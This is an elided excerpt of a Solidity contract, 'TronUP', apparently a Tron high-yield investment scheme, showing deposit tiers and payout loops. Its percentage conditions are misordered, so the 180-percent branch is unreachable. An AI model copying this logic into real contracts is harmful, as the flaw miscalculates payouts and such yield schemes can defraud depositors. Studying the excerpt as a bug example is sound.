...
contract TronUP {
    ...
    function deposit(address _referral) external payable {
        ...
        uint16 _perc = 140;
        if(msg.value > 1000000000){ _perc = 200; }
        else if(msg.value > 2500000000){ _perc = 180; }
        else if(msg.value > 500000000){ _perc = 160; }
    ...
    function _updateTotalPayout(address _addr) private{
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * player.deposits[i].perc / investment_days / 8640000;
            }
        }
    }
    ...
    function payoutOf(address _addr) view external returns(uint256 value) {
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            if(from < to) {
                value += dep.amount * (to - from) * player.deposits[i].perc / investment_days / 8640000;
            }
        }
